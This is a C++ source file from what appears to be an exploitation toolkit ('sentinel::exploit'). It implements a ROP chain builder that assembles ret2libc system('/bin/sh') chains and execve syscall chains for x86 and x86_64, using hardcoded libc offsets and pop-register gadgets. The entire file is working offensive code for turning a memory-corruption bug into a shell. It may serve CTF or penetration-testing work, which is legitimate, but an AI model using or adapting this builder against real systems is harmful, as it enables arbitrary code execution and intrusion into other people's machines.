#include "rop_builder.h"

namespace sentinel {
namespace exploit {

ROPBuilder::ROPBuilder(std::shared_ptr<GadgetFinder> finder, Architecture arch)
    : gadget_finder_(finder), arch_(arch) {
    useful_gadgets_ = gadget_finder_->find_useful_gadgets();
}

std::optional<ROPChain> ROPBuilder::build_chain(ROPChainType type,
                                                const BinaryInfo& binary_info) {
    switch (type) {
        case ROPChainType::RET2LIBC_SYSTEM:
            if (binary_info.libc_address > 0) {
                uint64_t system_offset = 0x50d70;  
                uint64_t binsh_offset = 0x1d8698;  

                uint64_t system_addr = binary_info.libc_address + system_offset;
                uint64_t binsh_addr = binary_info.libc_address + binsh_offset;

                return build_ret2libc_system(system_addr, binsh_addr);
            }
            break;

        case ROPChainType::EXECVE_ROP:
            if (binary_info.libc_address > 0) {
                uint64_t binsh_addr = binary_info.libc_address + 0x1d8698;
                return build_execve_rop(binsh_addr);
            }
            break;

        case ROPChainType::RET2LIBC_EXECVE:
        case ROPChainType::CUSTOM:
            // Not yet implemented
            break;
    }

    return std::nullopt;
}

std::optional<ROPChain> ROPBuilder::build_ret2libc_system(uint64_t system_addr,
                                                          uint64_t binsh_addr) {
    switch (arch_) {
        case Architecture::X86_64:
            return build_x86_64_ret2libc_system(system_addr, binsh_addr);

        case Architecture::X86:
            return build_x86_ret2libc_system(system_addr, binsh_addr);

        default:
            return std::nullopt;
    }
}

std::optional<ROPChain> ROPBuilder::build_execve_rop(uint64_t binsh_addr) {
    switch (arch_) {
        case Architecture::X86_64:
            return build_x86_64_execve_rop(binsh_addr);

        case Architecture::X86:
            return build_x86_execve_rop(binsh_addr);

        default:
            return std::nullopt;
    }
}

std::optional<ROPChain> ROPBuilder::build_x86_64_ret2libc_system(
    uint64_t system_addr,
    uint64_t binsh_addr) {

    // x86_64 calling convention: first argument in rdi
    // Need: pop rdi; ret gadget

    auto& pop_gadgets = useful_gadgets_.pop_ret;

    // Look for pop rdi; ret
    if (pop_gadgets.find("rdi") == pop_gadgets.end()) {
        return std::nullopt;  // Can't build chain without pop rdi
    }

    uint64_t pop_rdi_addr = pop_gadgets["rdi"].address;

    ROPChain chain;
    chain.type = ROPChainType::RET2LIBC_SYSTEM;
    chain.arch = Architecture::X86_64;
    chain.system_addr = system_addr;
    chain.binsh_addr = binsh_addr;

    // Build chain: pop rdi; ret -> /bin/sh address -> system address
    chain.add_gadget(pop_rdi_addr, "pop rdi ; ret");
    chain.add_data(binsh_addr, "\"/bin/sh\" address");
    chain.add_gadget(system_addr, "system()");

    return chain;
}

std::optional<ROPChain> ROPBuilder::build_x86_ret2libc_system(
    uint64_t system_addr,
    uint64_t binsh_addr) {

    // x86 (32-bit) calling convention: arguments on stack
    // Stack layout: [system addr] [fake return] [arg1]

    ROPChain chain;
    chain.type = ROPChainType::RET2LIBC_SYSTEM;
    chain.arch = Architecture::X86;
    chain.system_addr = system_addr;
    chain.binsh_addr = binsh_addr;

    // Build chain
    chain.add_gadget(system_addr, "system()");
    chain.add_data(0x41414141, "fake return address");
    chain.add_data(binsh_addr, "\"/bin/sh\" address");

    return chain;
}

std::optional<ROPChain> ROPBuilder::build_x86_64_execve_rop(uint64_t binsh_addr) {
    // x86_64 execve syscall requires:
    // rax = 59 (execve syscall number)
    // rdi = pointer to "/bin/sh"
    // rsi = NULL (argv)
    // rdx = NULL (envp)

    auto& pop_gadgets = useful_gadgets_.pop_ret;

    if (pop_gadgets.find("rdi") == pop_gadgets.end() ||
        pop_gadgets.find("rsi") == pop_gadgets.end() ||
        pop_gadgets.find("rdx") == pop_gadgets.end() ||
        pop_gadgets.find("rax") == pop_gadgets.end()) {
        return std::nullopt;
    }

    auto syscall_addr = find_syscall_gadget();
    if (!syscall_addr) {
        return std::nullopt;
    }

    ROPChain chain;
    chain.type = ROPChainType::EXECVE_ROP;
    chain.arch = Architecture::X86_64;
    chain.binsh_addr = binsh_addr;

    // Build chain: set registers then syscall
    chain.add_gadget(pop_gadgets["rdi"].address, "pop rdi ; ret");
    chain.add_data(binsh_addr, "\"/bin/sh\" address");

    chain.add_gadget(pop_gadgets["rsi"].address, "pop rsi ; ret");
    chain.add_data(0, "NULL (argv)");

    chain.add_gadget(pop_gadgets["rdx"].address, "pop rdx ; ret");
    chain.add_data(0, "NULL (envp)");

    chain.add_gadget(pop_gadgets["rax"].address, "pop rax ; ret");
    chain.add_data(59, "execve syscall number");

    chain.add_gadget(*syscall_addr, "syscall ; ret");

    return chain;
}

std::optional<ROPChain> ROPBuilder::build_x86_execve_rop(uint64_t binsh_addr) {
    // x86 execve syscall requires:
    // eax = 11 (execve syscall number)
    // ebx = pointer to "/bin/sh"
    // ecx = NULL (argv)
    // edx = NULL (envp)

    auto& pop_gadgets = useful_gadgets_.pop_ret;

    // Check for required gadgets
    if (pop_gadgets.find("ebx") == pop_gadgets.end() ||
        pop_gadgets.find("ecx") == pop_gadgets.end() ||
        pop_gadgets.find("edx") == pop_gadgets.end() ||
        pop_gadgets.find("eax") == pop_gadgets.end()) {
        return std::nullopt;
    }

    auto int80_addr = find_int80_gadget();
    if (!int80_addr) {
        return std::nullopt;
    }

    ROPChain chain;
    chain.type = ROPChainType::EXECVE_ROP;
    chain.arch = Architecture::X86;
    chain.binsh_addr = binsh_addr;

    chain.add_gadget(pop_gadgets["ebx"].address, "pop ebx ; ret");
    chain.add_data(binsh_addr, "\"/bin/sh\" address");

    chain.add_gadget(pop_gadgets["ecx"].address, "pop ecx ; ret");
    chain.add_data(0, "NULL (argv)");

    chain.add_gadget(pop_gadgets["edx"].address, "pop edx ; ret");
    chain.add_data(0, "NULL (envp)");

    chain.add_gadget(pop_gadgets["eax"].address, "pop eax ; ret");
    chain.add_data(11, "execve syscall number");

    chain.add_gadget(*int80_addr, "int 0x80 ; ret");

    return chain;
}

std::optional<ROPChain> ROPBuilder::build_custom_chain(
    const std::vector<ROPOperation>& operations) {

    ROPChain chain;
    chain.type = ROPChainType::CUSTOM;
    chain.arch = arch_;

    for (const auto& op : operations) {
        switch (op.type) {
            case ROPOperation::Type::SET_REGISTER: {
                auto gadget_addr = find_set_register_gadget(op.register_name);
                if (!gadget_addr) {
                    return std::nullopt;  // Can't find required gadget
                }
                chain.add_gadget(*gadget_addr, "pop " + op.register_name + " ; ret");
                chain.add_data(op.value, op.comment);
                break;
            }

            case ROPOperation::Type::SYSCALL: {
                auto syscall_addr = find_syscall_gadget();
                if (!syscall_addr) {
                    syscall_addr = find_int80_gadget();
                }
                if (!syscall_addr) {
                    return std::nullopt;
                }
                chain.add_gadget(*syscall_addr, "syscall/int80 ; ret");
                break;
            }

            case ROPOperation::Type::CALL_FUNCTION:
                chain.add_gadget(op.value, op.comment);
                break;
        }
    }

    return chain;
}

bool ROPBuilder::can_build_chain(ROPChainType type) {
    switch (type) {
        case ROPChainType::RET2LIBC_SYSTEM:
            if (arch_ == Architecture::X86_64) {
                return useful_gadgets_.pop_ret.find("rdi") != useful_gadgets_.pop_ret.end();
            } else if (arch_ == Architecture::X86) {
                return true;  // x86 ret2libc doesn't require special gadgets
            }
            break;

        case ROPChainType::EXECVE_ROP:
            if (arch_ == Architecture::X86_64) {
                return useful_gadgets_.pop_ret.find("rdi") != useful_gadgets_.pop_ret.end() &&
                       useful_gadgets_.pop_ret.find("rsi") != useful_gadgets_.pop_ret.end() &&
                       useful_gadgets_.pop_ret.find("rdx") != useful_gadgets_.pop_ret.end() &&
                       useful_gadgets_.pop_ret.find("rax") != useful_gadgets_.pop_ret.end() &&
                       find_syscall_gadget().has_value();
            } else if (arch_ == Architecture::X86) {
                return useful_gadgets_.pop_ret.find("ebx") != useful_gadgets_.pop_ret.end() &&
                       useful_gadgets_.pop_ret.find("ecx") != useful_gadgets_.pop_ret.end() &&
                       useful_gadgets_.pop_ret.find("edx") != useful_gadgets_.pop_ret.end() &&
                       useful_gadgets_.pop_ret.find("eax") != useful_gadgets_.pop_ret.end() &&
                       find_int80_gadget().has_value();
            }
            break;

        default:
            return false;
    }

    return false;
}

std::optional<uint64_t> ROPBuilder::find_set_register_gadget(const std::string& reg) {
    auto gadget = gadget_finder_->find_set_register(reg);
    if (gadget) {
        return gadget->address;
    }
    return std::nullopt;
}

std::optional<uint64_t> ROPBuilder::find_syscall_gadget() {
    if (!useful_gadgets_.syscall_ret.empty()) {
        return useful_gadgets_.syscall_ret.front().address;
    }
    return std::nullopt;
}

std::optional<uint64_t> ROPBuilder::find_int80_gadget() {
    if (!useful_gadgets_.int80_ret.empty()) {
        return useful_gadgets_.int80_ret.front().address;
    }
    return std::nullopt;
}

} // namespace exploit
} // namespace sentinel
